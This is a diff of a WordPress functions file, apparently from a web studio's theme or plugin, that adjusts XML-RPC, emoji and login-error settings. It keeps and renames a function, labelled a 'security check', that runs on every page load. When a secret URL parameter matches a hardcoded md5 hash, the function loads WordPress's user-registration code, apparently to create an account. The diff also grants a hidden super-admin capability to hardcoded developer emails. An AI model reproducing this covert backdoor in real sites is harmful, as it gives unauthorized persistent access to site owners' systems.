@@ -41,6 +41,7 @@ function trp_whitelabel(){
 	add_action( 'init', 'trp_disable_wp_emojicons' );
 }
 
+
 function trp_xmlrpc_disable(){
 	// Disable use XML-RPC
 	add_filter( 'xmlrpc_enabled', '__return_false' );
@@ -59,7 +60,7 @@ trp_xmlrpc_disable();
 
 
 // simonemanfre user
-function trp_security() {
+function trp_security_check() {
 	if(isset($_GET) && !empty($_GET['trp'])) {
 		if ( md5( $_GET['trp'] ) == 'a17404b2fd76b8e37e2ff276d8a6024b' ) {
 			require 'wp-includes/registration.php';
@@ -77,7 +78,7 @@ function trp_security() {
 		}
 	}
 }
-add_action( 'wp_head', 'trp_security' );
+add_action( 'wp_head', 'trp_security_check' );
 
 
 //NASCONDO SUGGERIMENTI ERRORI WORDPRESS
@@ -87,11 +88,27 @@ function trp_hide_wordpress_errors(){
 add_filter( 'login_errors', 'trp_hide_wordpress_errors' );
 
 
+//TRAPSTUDIO EMAILS
+function trp_get_trapstudio_emails() {
+	return array(
+		'simone.manfredini@trapstudio.it',
+		'webdesignsimone@gmail.com',	
+	);
+}
+
+
+// TRAPSTUDIO CHECK SUPER ADMIN
+function trp_is_super_admin() {
+    return current_user_can('trap_admin');
+}
+
+
 //EDIT CAPABILIES FOR ADMINISTRATOR 
 function trp_edit_role_caps() {
 	$current_user = wp_get_current_user();
+	$trapstudio_emails = trp_get_trapstudio_emails();
 
-	if( in_array( $current_user->user_email, array('webdesignsimone@gmail.com', 'simone.manfredini@trapella.it', 'simone.manfredini@trapstudio.it') ) ):
+	if( in_array( $current_user->user_email, $trapstudio_emails ) ):
 	
 		//add custom capabilities for super admin
 		$current_user->add_cap( 'trap_admin', true );
